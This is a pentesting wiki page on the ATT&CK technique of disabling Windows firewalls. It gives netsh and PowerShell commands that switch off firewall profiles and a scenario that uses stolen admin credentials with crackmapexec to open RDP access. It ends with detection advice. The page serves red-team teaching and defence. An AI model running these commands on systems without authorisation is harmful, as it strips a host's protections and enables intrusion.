---
description: https://attack.mitre.org/techniques/T1562/004/
---

# Disable or Modify System Firewall

**ATT\&CK ID:** [T1562.004](https://attack.mitre.org/techniques/T1562/004/)

**Permissions Required:** <mark style="color:red;">**Administrator**</mark> | <mark style="color:red;">**SYSTEM**</mark>

**Description**

Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.

Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.

\[[Source](https://attack.mitre.org/techniques/T1562/004/)]

## Techniques

### CMD

```bash
# Disable all profiles
netsh advfirewall set allprofiles state off

# Disable public profile
netsh advfirewall set publicprofile state off

# Disable domain profile
netsh advfirewall set domainprofile state off

# Disable current profile
netsh advfirewall set  currentprofile state off

# Enable all profiles
netsh advfirewall set allprofiles state on
```

### PowerShell

```powershell
# Disable all profiles
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Disable public profile
Set-NetFirewallProfile -Profile public -Enabled False

# Disable domain profile
Set-NetFirewallProfile -Profile domain -Enabled False

# Disable private profile
Set-NetFirewallProfile -Profile private -Enabled False

# Enable all profiles
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```

## Scenario

In the scenario below we have gained access to administrative credentials for the host 10.10.10.10. However, we are looking to gain `RDP` access.

Scanning port 3389 with `Nmap` reveals the port is filtered. This is because there is a firewall rule blocking inbound connections to 10.10.10.10.

![](<../../../../.gitbook/assets/image (72) (2).png>)

As we have administrative credentials we perform command execution with `crackmapexec`. We execute the following command to view the current firewall profiles on the target host.

```bash
crackmapexec smb '<IP>' -u '<User>' -p '<Password>' -d '<Domain>'  -X 'Get-NetFirewallProfile -Name Public,Domain,Private | Select Name,Enabled'
```

![](<../../../../.gitbook/assets/image (1451).png>)

Next, we execute the command below to turn off all available firewall profiles.

```bash
crackmapexec smb '<IP>' -u '<User>' -p '<Password>' -d '<Domain>'  -X 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'
```

![](<../../../../.gitbook/assets/image (75) (2).png>)

Then check the current status of the profiles again.

```bash
crackmapexec smb '<IP>' -u '<User>' -p '<Password>' -d '<Domain>'  -X 'Get-NetFirewallProfile -Name Public,Domain,Private | Select Name,Enabled'
```

![](<../../../../.gitbook/assets/image (1241).png>)

Where we can then confirm we are now able to see the port 3389 is open for `RDP` access. We may now connect using a tool such as `xfreerdp`.

![](<../../../../.gitbook/assets/image (1332).png>)

## Mitigation

* Monitor for changes in the status of the system firewall such as Windows Security Auditing events 5025 (The Windows firewall service has been stopped) and 5034 (The Windows firewall driver was stopped).
* Monitor for changes made to windows Registry keys and/or values that adversaries might use to disable or modify System Firewall settings such as HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy.
* Monitor executed commands and arguments associated with disabling or the modification of system firewalls such as `netsh advfirewall set allprofiles state off`

## Further Reading

**Enable / disable firewall from command line:** [https://www.windows-commandline.com/enable-disable-firewall-command-line/](https://www.windows-commandline.com/enable-disable-firewall-command-line/)
